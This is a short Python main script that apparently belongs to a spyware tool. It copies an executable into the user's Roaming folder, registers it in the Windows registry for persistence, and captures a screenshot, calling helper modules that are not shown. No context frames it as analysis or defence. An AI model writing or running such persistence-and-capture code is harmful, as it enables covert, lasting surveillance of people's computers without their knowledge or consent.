from system_utils import copy_to_roaming, add_to_registry
from screenshot import take_screenshot

if __name__ == "__main__":
    exe_path = copy_to_roaming()
    add_to_registry(exe_path)
    take_screenshot()
